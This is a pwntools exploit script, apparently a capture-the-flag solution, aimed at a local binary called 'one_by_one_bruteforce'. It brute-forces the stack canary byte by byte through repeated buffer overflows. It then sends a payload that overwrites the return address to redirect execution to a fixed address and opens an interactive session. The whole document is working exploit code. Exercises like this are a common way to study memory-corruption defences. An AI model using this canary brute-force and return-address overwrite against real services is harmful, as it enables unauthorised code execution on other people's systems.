from pwn import *

p = process("./one_by_one_bruteforce")

def bruteforece1bit():
	global known
	for i in range(256):
		p1 = "a" * 0x108
		p1 += known
		p1 += chr(i)
		p.sendafter("one_by_one_bruteforce\n",p1)
		try:
			info = p.recvuntil("\n")
			if "*** stack smashing detected ***:" in info:
				p.send("n\n")
				continue
			else:
				known += chr(i)
				break
		except:
			log.info("maybe there something wrong")
			break

def bruteforce_canary():
	global known
	known += "\x00"
	for i in range(7):
		bruteforece1bit()
		if i != 6:
			p.send("n\n")
		else:
			p.send("y\n")

context.log_level = "debug"
target = 0x000000000040083E
known = ""
bruteforce_canary()
canary = u64(known)
log.success("canary:" + hex(canary))
p2 = "a" * 0x108 + p64(canary) + p64(0) + p64(target)
p.sendafter("go\n",p2)
p.interactive()
